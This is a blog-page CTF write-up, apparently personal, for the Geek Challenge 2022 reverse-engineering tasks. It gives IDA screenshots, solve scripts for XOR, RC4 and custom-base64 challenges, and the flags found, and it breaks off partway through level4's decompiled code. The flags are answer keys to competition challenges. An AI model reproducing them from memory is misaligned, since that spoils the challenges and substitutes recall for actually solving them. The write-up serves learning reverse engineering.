<!DOCTYPE html>
<html lang="zh-CN">
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
    <meta name="keywords" content="Hexo Theme Redefine">
    <meta name="description" content="Hexo Theme Redefine">
    <meta name="author" content="二木">
    
    <title>
        
            极客大挑战2022 |
        
        二木的博客小屋
    </title>
    
<link rel="stylesheet" href="/css/style.css">

    <link rel="shortcut icon" href="/images/9.webp">
    
<link rel="stylesheet" href="/css/fontawesome.min.css">

    
<link rel="stylesheet" href="/css/v5-font-face.min.css">

    
<link rel="stylesheet" href="/css/duotone.min.css">

    
<link rel="stylesheet" href="/css/brands.min.css">

    
<link rel="stylesheet" href="/css/solid.min.css">

    
<link rel="stylesheet" href="/css/css2.css">

    <link rel="preconnect" href="https://fonts.googleapis.com">
    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
    <script id="hexo-configurations">
    let REDEFINE = window.REDEFINE || {};
    REDEFINE.hexo_config = {"hostname":"captainruler.github.io","root":"/","language":"zh-CN","path":"search.xml"};
    REDEFINE.theme_config = {"toc":{"enable":true,"number":true,"expand_all":true,"init_open":true},"style":{"primary_color":"#005080","avatar":"/images/7.webp","favicon":"/images/9.webp","article_img_align":"center","right_side_width":"210px","content_max_width":"1000px","nav_color":{"left":"#7faadb","right":"#da9e5b","transparency":20},"hover":{"shadow":true,"scale":false},"first_screen":{"enable":true,"background_image":{"light":"/images/1.jpg","dark":"/images/1_webp.webp"},"title_color":{"light":"#fff","dark":"#d1d1b6"},"description":"二木的博客小屋"},"scroll":{"progress_bar":{"enable":true},"percent":{"enable":true}}},"local_search":{"enable":true,"preload":true},"code_copy":{"enable":true},"pjax":{"enable":true},"lazyload":{"enable":true},"version":"0.3.5\nSearch"};
    REDEFINE.language_ago = {"second":"%s 秒前","minute":"%s 分钟前","hour":"%s 小时前","day":"%s 天前","week":"%s 周前","month":"%s 个月前","year":"%s 年前"};
  </script>
<meta name="generator" content="Hexo 6.3.0">
<style>.github-emoji { position: relative; display: inline-block; width: 1.2em; min-height: 1.2em; overflow: hidden; vertical-align: top; color: transparent; }  .github-emoji > span { position: relative; z-index: 10; }  .github-emoji img, .github-emoji .fancybox { margin: 0 !important; padding: 0 !important; border: none !important; outline: none !important; text-decoration: none !important; user-select: none !important; cursor: auto !important; }  .github-emoji img { height: 1.2em !important; width: 1.2em !important; position: absolute !important; left: 50% !important; top: 50% !important; transform: translate(-50%, -50%) !important; user-select: none !important; cursor: auto !important; } .github-emoji-fallback { color: inherit; } .github-emoji-fallback img { opacity: 0 !important; }</style>
</head>


<body>
<div class="progress-bar-container">
    
        <span class="scroll-progress-bar"></span>
    

    
        <span class="pjax-progress-bar"></span>
        <span class="pjax-progress-icon">
            <i class="fas fa-circle-notch fa-spin"></i>
        </span>
    
</div>


<main class="page-container">

    

    <div class="page-main-content">

        <div class="page-main-content-top">
            <header class="header-wrapper">
    
    <div class="header-content">
        <div class="left">
            
            <a class="logo-title" href="/">
                二木的博客小屋
            </a>
        </div>

        <div class="right">
            <div class="pc">
                <ul class="menu-list">
                    
                        <li class="menu-item">
                            <a class=""
                               href="/"
                            >
                                首页
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/archives"
                            >
                                归档
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/categories"
                            >
                                分类
                            </a>
                        </li>
                    
                        <li class="menu-item">
                            <a class=""
                               href="/about"
                            >
                                关于
                            </a>
                        </li>
                    
                    
                        <li class="menu-item search search-popup-trigger">
                            <i class="fas fa-search"></i>
                        </li>
                    
                </ul>
            </div>
            <div class="mobile">
                
                    <div class="icon-item search search-popup-trigger"><i class="fas fa-search"></i></div>
                
                <div class="icon-item menu-bar">
                    <div class="menu-bar-middle"></div>
                </div>
            </div>
        </div>
    </div>

    <div class="header-drawer">
        <ul class="drawer-menu-list">
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/">首页</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/archives">归档</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/categories">分类</a>
                </li>
            
                <li class="drawer-menu-item flex-center">
                    <a class=""
                       href="/about">关于</a>
                </li>
            
        </ul>
    </div>

    <div class="window-mask"></div>

</header>


        </div>

        <div class="page-main-content-middle">

            <div class="main-content">

                
                    <div class="fade-in-down-animation">
    <div class="post-page-container">
        <div class="article-content-container">
            <div class="article-title">
                <span class="title-hover-animation"><h1 style="font-size:2rem; font-weight: bold; margin: 10px 0;">极客大挑战2022</h1></span>
            </div>

            
                <div class="article-header">
                    <div class="avatar">
                        <img src="/images/7.webp">
                    </div>
                    <div class="info">
                        <div class="author">
                            <span class="name">二木</span>
                            
                                <span class="author-label">lol</span>
                            
                        </div>
                        <div class="meta-info">
                            <div class="article-meta-info">
    <span class="article-date article-meta-item">
        <i class="fa-duotone fa-pen-line"></i>&nbsp;
        <span class="pc">2022-12-15 22:30:58</span>
        <span class="mobile">2022-12-15 22:30</span>
    </span>
    
        <span class="article-categories article-meta-item">
            <i class="fa-duotone fa-folder-open"></i></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/categories/%E6%AF%94%E8%B5%9B/">比赛</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    
    
        <span class="article-tags article-meta-item">
            <i class="fa-duotone fa-tags"></i></i>&nbsp;
            <ul>
                
                    <li>
                        <a href="/tags/CTF/">CTF</a>&nbsp;
                    </li>
                
            </ul>
        </span>
    

    
    
        <span class="article-wordcount article-meta-item">
            <i class="fas fa-file-word"></i>&nbsp;<span>7.6k 字</span>
        </span>
    
    
        <span class="article-min2read article-meta-item">
            <i class="fas fa-clock"></i>&nbsp;<span>36 分钟</span>
        </span>
    
    
        <span class="article-pv article-meta-item">
            <i class="fas fa-eye"></i>&nbsp;<span id="busuanzi_value_page_pv"></span>
        </span>
    
</div>

                        </div>
                    </div>
                </div>
            

            <div class="article-content markdown-body">
                <h2 id="RE"><a href="#RE" class="headerlink" title="RE"></a>RE</h2><h3 id="level1"><a href="#level1" class="headerlink" title="level1"></a>level1</h3><p>查壳：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122040951484.png" alt="image-20221122040951484"></p>
<p>将题目拖入ida得到:</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122035102613.png" alt="image-20221122035102613"></p>
<p>一个简单的逆向,脚本：</p>
<pre class="line-numbers language-c++" data-language="c++"><code class="language-c++">#include&lt;iostream&gt;
using namespace std;
int main(){
    char v1=-85;
    int v2 = 0;
    char flag[40]="S";
    int compare[40]={
  0xA1, 0xBA, 0x6E, 0x46, 0x80, 0xF4, 0xD9, 0xAA, 0xB4, 0x36, 
  0x5A, 0xCC, 0x8C, 0x1E, 0x95, 0x21, 0x8F, 0x43, 0xE1, 0x13, 
  0x8A, 0xA8, 0x6A, 0x42, 0xAE, 0xFB, 0xF7, 0xA5, 0x9D, 0x0B, 
  0x4B, 0xDE, 0xBA, 0x00, 0x87, 0x23, 0x90, 0x46, 0xD3, 0xDF
};
    for(int i=0;i&lt;=39;i++){
        for(int j=0;j&lt;=50;j++){
            v1^=j^v2^0x5f;
            compare[i]^=flag[i];
            compare[i]^=v1;
            ++v2;
            flag[i+1]=char(compare[i]);
        }
    }
    printf("%s",flag);
    return 0;
}
<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><strong>flag:   SYC{bIIngxvJqVDOUqbuiHDpadwfdRePetteyBP}</strong></p>
<h3 id="level2"><a href="#level2" class="headerlink" title="level2"></a>level2</h3><p>查壳：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122044551533.png" alt="image-20221122044551533"></p>
<p>拖入ida：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122040753957.png" alt="image-20221122040753957"></p>
<p>本题用了RC4进行加密，RC4是一种<strong>对称流加密</strong>算法，也就是对于密文再经过同一个加密函数一次也就得到了明文</p>
<p>由于本题中对于数据共进行了两种处理（RC4和异或），我们知道这两种加密都是可逆的，因此只需要对密文再进行这个程序的一个变化极客得到明文，也是就是正确时输入：</p>
<p>首先提取comparedata：</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122043041196.png" alt="image-20221122043041196"></p>
<p>开始远程动态调试：首先填充输入53个字符，然后读入后进入第一个断点，此时我们用Pando0s版的LazyIDA的paste功能，将提取到的comparedata放入input中，然后进行之后的操作</p>
<p>动态调试到比较函数，可看到此时s的值已将变为了flag</p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122044233955.png" alt="image-20221122044233955"></p>
<p><strong>flag：SYC{uynzlNIOKWLJGRGbDetOwUewRKJmydKkyLNavulGCJVjrcyi}</strong></p>
<h3 id="Level-3"><a href="#Level-3" class="headerlink" title="Level 3"></a>Level 3</h3><h4 id="查壳："><a href="#查壳：" class="headerlink" title="查壳："></a>查壳：<img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122044620644.png" alt="image-20221122044620644"></h4><p>拖入ida：<img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122121444502.png" alt="image-20221122121444502"></p>
<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122121451562.png" alt="image-20221122121451562"></p>
<h4 id="代码分析："><a href="#代码分析：" class="headerlink" title="代码分析："></a>代码分析：</h4><p>可以看到是个base64加密，将加密后的数据后的数据放在s1中进行与s2的比较。可知加密长度为33，加密后得到的长度为44，</p>
<p> 解题思路;</p>
<p><strong>由于本题的base64是魔改后的，因此我们需要先获取魔改后的base64的表，然后根据得到的表中密文中每个元素所对应的下标，将标准表的对应值拼接上去即可</strong>  感觉表述的有点奇怪，详见<a class="link" target="_blank" rel="noopener" href="https://www.bilibili.com/video/BV12e4y1z7EU/?spm_id_from=333.999.0.0&amp;vd_source=ef1c6b8dec2e0db6d9153ec87ef3b0b3">https://www.bilibili.com/video/BV12e4y1z7EU/?spm_id_from=333.999.0.0&amp;vd_source=ef1c6b8dec2e0db6d9153ec87ef3b0b3<i class="fas fa-external-link-alt"></i></a></p>
<p>一下是脚本</p>
<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">import</span> base64
CT<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0x2F</span><span class="token punctuation">,</span> <span class="token number">0xE8</span><span class="token punctuation">,</span> <span class="token number">0x15</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0x33</span><span class="token punctuation">,</span> <span class="token number">0x13</span><span class="token punctuation">,</span> <span class="token number">0x54</span><span class="token punctuation">,</span> <span class="token number">0x8B</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xB2</span><span class="token punctuation">,</span> <span class="token number">0xD3</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x71</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span> <span class="token number">0xFA</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0x3A</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0x38</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0x67</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x75</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0x90</span><span class="token punctuation">,</span><span class="token number">0x16</span><span class="token punctuation">,</span> <span class="token number">0x41</span><span class="token punctuation">,</span> <span class="token number">0xB1</span><span class="token punctuation">,</span> <span class="token number">0x69</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0x4D</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0xC1</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0xAA</span><span class="token punctuation">,</span> <span class="token number">0xA1</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0xC2</span><span class="token punctuation">,</span> <span class="token number">0x1E</span><span class="token punctuation">,</span> <span class="token number">0x52</span><span class="token punctuation">,</span> <span class="token number">0xC3</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x34</span><span class="token punctuation">,</span> <span class="token number">0x09</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0xBB</span><span class="token punctuation">,</span> <span class="token number">0x8C</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xC9</span><span class="token punctuation">,</span> <span class="token number">0x31</span><span class="token punctuation">,</span> <span class="token number">0xE2</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">,</span> <span class="token number">0xF8</span><span class="token punctuation">,</span> <span class="token number">0xB7</span><span class="token punctuation">]</span>
ST<span class="token operator">=</span><span class="token string">"ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789+/"</span>
com_data<span class="token operator">=</span><span class="token punctuation">[</span><span class="token number">0xBC</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0xD1</span><span class="token punctuation">,</span> <span class="token number">0x4C</span><span class="token punctuation">,</span> <span class="token number">0xEE</span><span class="token punctuation">,</span> <span class="token number">0x56</span><span class="token punctuation">,</span> <span class="token number">0x4E</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0x22</span><span class="token punctuation">,</span> <span class="token number">0xD0</span><span class="token punctuation">,</span> <span class="token number">0x8A</span><span class="token punctuation">,</span> <span class="token number">0x06</span><span class="token punctuation">,</span> <span class="token number">0x63</span><span class="token punctuation">,</span> <span class="token number">0x68</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0xC5</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0x59</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x78</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0xA7</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0xD2</span><span class="token punctuation">,</span> <span class="token number">0x36</span><span class="token punctuation">,</span> <span class="token number">0xA6</span><span class="token punctuation">,</span> <span class="token number">0xEF</span><span class="token punctuation">,</span> <span class="token number">0xDF</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0xC6</span><span class="token punctuation">,</span> <span class="token number">0xE4</span><span class="token punctuation">,</span> <span class="token number">0x43</span><span class="token punctuation">,</span> <span class="token number">0x29</span><span class="token punctuation">,</span> <span class="token number">0xCC</span><span class="token punctuation">,</span> <span class="token number">0x3C</span><span class="token punctuation">]</span>
<span class="token comment">#str="000000000001000010000011000100000101000110000111001000001001001010001011001100001101001110001111010000010001010010010011010100010101010110010111011000011001011010011011011100011101011110011111100000100001100010100011100100100101100110100111101000101001101010101011101100101101101110101111110000110001110010110011110100110101110110110111111000111001111010111011111100111101111110111111"</span>
<span class="token triple-quoted-string string">""" for i in range(0,len(str),8):
    print(hex(int(str[i:i+8],2))[2:])        #,2表示将原来2进制的转为10进制 ，再用hex转为16进制（便于在ida中使用）[2:]表示从每项的下标为2开始显示到结束 """</span>
flag<span class="token operator">=</span><span class="token string">""</span>
<span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">"len="</span><span class="token punctuation">,</span><span class="token builtin">len</span><span class="token punctuation">(</span>CT<span class="token punctuation">)</span><span class="token punctuation">)</span>
<span class="token keyword">for</span> i <span class="token keyword">in</span> com_data<span class="token punctuation">:</span>  
    flag<span class="token operator">+=</span>ST<span class="token punctuation">[</span>CT<span class="token punctuation">.</span>index<span class="token punctuation">(</span>i<span class="token punctuation">)</span><span class="token punctuation">]</span>   <span class="token comment">#z这里的flag就转变为正常加密的base64，再解密就好了</span>
missing_padding<span class="token operator">=</span><span class="token number">4</span><span class="token operator">-</span><span class="token builtin">len</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token operator">%</span><span class="token number">4</span>   <span class="token comment">#该变量为记录密文与4的倍数差值</span>
<span class="token keyword">if</span><span class="token punctuation">(</span>missing_padding<span class="token punctuation">)</span><span class="token punctuation">:</span>
    flag<span class="token operator">+=</span><span class="token string">'='</span><span class="token operator">*</span>missing_padding
<span class="token keyword">print</span><span class="token punctuation">(</span>base64<span class="token punctuation">.</span>b64decode<span class="token punctuation">(</span>flag<span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>

<p><img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122123227939.png" alt="image-20221122123227939"></p>
<p><strong>flag：SYC{LMvuynzlNIOKWLJGRGbDetOwUewR}</strong></p>
<h3 id="level4"><a href="#level4" class="headerlink" title="level4"></a>level4</h3><p>查壳：<img lazyload="" src="/images/loading.svg" data-src="https://pubpic-1300065410.cos.ap-chengdu.myqcloud.com/typora/image-20221122131016656.png" alt="image-20221122131016656"></p>
<p>放入ida：</p>
<pre class="line-numbers language-c" data-language="c"><code class="language-c"><span class="token keyword">unsigned</span> __int64 <span class="token function">level4</span><span class="token punctuation">(</span><span class="token keyword">void</span><span class="token punctuation">)</span>
<span class="token punctuation">{</span>
  <span class="token keyword">int</span> i<span class="token punctuation">;</span> <span class="token comment">// [rsp+8h] [rbp-398h]</span>
  <span class="token keyword">int</span> j<span class="token punctuation">;</span> <span class="token comment">// [rsp+Ch] [rbp-394h]</span>
  <span class="token keyword">int</span> k<span class="token punctuation">;</span> <span class="token comment">// [rsp+10h] [rbp-390h]</span>
  <span class="token keyword">int</span> l<span class="token punctuation">;</span> <span class="token comment">// [rsp+14h] [rbp-38Ch]</span>
  <span class="token keyword">int</span> v5<span class="token punctuation">;</span> <span class="token comment">// [rsp+18h] [rbp-388h]</span>
  <span class="token keyword">int</span> m<span class="token punctuation">;</span> <span class="token comment">// [rsp+1Ch] [rbp-384h]</span>
  <span class="token keyword">int</span> n<span class="token punctuation">;</span> <span class="token comment">// [rsp+20h] [rbp-380h]</span>
  <span class="token keyword">int</span> ii<span class="token punctuation">;</span> <span class="token comment">// [rsp+24h] [rbp-37Ch]</span>
  <span class="token keyword">int</span> input<span class="token punctuation">[</span><span class="token number">64</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+30h] [rbp-370h]</span>
  <span class="token keyword">int</span> v10<span class="token punctuation">[</span><span class="token number">128</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+130h] [rbp-270h]</span>
  <span class="token keyword">char</span> s<span class="token punctuation">[</span><span class="token number">104</span><span class="token punctuation">]</span><span class="token punctuation">;</span> <span class="token comment">// [rsp+330h] [rbp-70h] BYREF</span>
  <span class="token keyword">unsigned</span> __int64 v12<span class="token punctuation">;</span> <span class="token comment">// [rsp+398h] [rbp-8h]</span>

  v12 <span class="token operator">=</span> <span class="token function">__readfsqword</span><span class="token punctuation">(</span><span class="token number">0x28u</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"This is level4! Do you know z3 ? "</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"show me your flag:"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token function">input_string</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token keyword">if</span> <span class="token punctuation">(</span> <span class="token function">strlen</span><span class="token punctuation">(</span>s<span class="token punctuation">)</span> <span class="token operator">!=</span> <span class="token number">64</span> <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token function">puts</span><span class="token punctuation">(</span><span class="token string">"failed!"</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
    <span class="token function">exit</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  <span class="token keyword">for</span> <span class="token punctuation">(</span> i <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> i <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>i <span class="token punctuation">)</span>
  <span class="token punctuation">{</span>
    <span class="token keyword">for</span> <span class="token punctuation">(</span> j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;=</span> <span class="token number">7</span><span class="token punctuation">;</span> <span class="token operator">++</span>j <span class="token punctuation">)</span>
      input<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">*</span> i <span class="token operator">+</span> j<span class="token punctuation">]</span> <span class="token operator">=</span> s<span class="token punctuation">[</span><span class="token number">8</span> <span class="token operator">*</span> i <span class="token operator">+</span> j<span class="token punctuation">]</span><span class="token punctuation">;</span>
  <span class="token punctuation">}</span>
  v10<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">686</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">867</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">369</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">795</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">4</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">754</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">5</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">93</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">6</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">143</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">501</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">8</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">424</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">9</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">107</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">10</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">881</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">11</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">168</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">12</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">216</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">13</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">818</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">14</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">46</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">15</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">472</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">816</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">17</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">923</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">18</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">995</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">19</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">794</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">20</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">419</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">21</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">242</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">22</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">489</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">23</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">707</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">24</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">822</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">25</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">456</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">26</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">400</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">27</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">998</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">28</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">680</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">29</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">908</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">30</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">655</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">31</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">221</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">32</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">486</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">33</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">176</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">34</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">284</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">35</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">392</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">36</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">790</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">37</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">331</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">38</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">398</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">39</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">671</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">40</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">736</span><span class="token punctuation">;</span>
  v10<span class="token punctuation">[</span><span class="token number">41</span><span class="token punctuation">]</span> <span class="token operator">=</span> <span class="token number">556</span><span class="token punctuation">;</span>
